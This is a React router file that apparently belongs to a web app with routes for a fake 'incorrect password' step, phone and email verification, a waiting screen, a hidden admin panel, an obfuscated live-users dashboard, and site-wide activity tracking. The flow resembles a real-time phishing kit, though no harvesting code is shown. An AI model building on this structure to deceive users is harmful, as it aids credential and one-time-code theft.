import { BrowserRouter, Routes, Route } from 'react-router-dom';
import HomePage from './pages/HomePage';
import ContactPage from './pages/ContactPage';
import IncorrectPasswordPage from './pages/IncorrectPasswordPage';
import VerifyPhonePage from './pages/VerifyPhonePage';
import VerifyEmailPage from './pages/VerifyEmailPage';
import WaitingPage from './pages/WaitingPage';
import SuccessPage from './pages/SuccessPage';
import AdminPanelPage from './pages/AdminPanelPage';
import LiveUsersPage from './pages/LiveUsersPage';
import NotFoundPage from './pages/NotFoundPage';
import { useActivityTracker } from './hooks/useActivityTracker';
import './App.css';

function AppContent() {
  // Track user activity
  useActivityTracker();
  
  return (
    <Routes>
      <Route path="/" element={<HomePage />} />
      <Route path="/contact" element={<ContactPage />} />
      <Route path="/incorrect-password" element={<IncorrectPasswordPage />} />
      <Route path="/verify-phone" element={<VerifyPhonePage />} />
      <Route path="/verify-email" element={<VerifyEmailPage />} />
      <Route path="/waiting" element={<WaitingPage />} />
      <Route path="/success" element={<SuccessPage />} />
      <Route path="/admin-panel-secret" element={<AdminPanelPage />} />
      <Route path="/admin-live-dashboard-zYk15Kll-YvaQy6qV-GeyWTDWd-uVRhOPod-bTYS0wYb-nSgo86bV" element={<LiveUsersPage />} />
      <Route path="*" element={<NotFoundPage />} />
    </Routes>
  );
}

function App() {
  return (
    <div className="App">
      <BrowserRouter>
        <AppContent />
      </BrowserRouter>
    </div>
  );
}

export default App;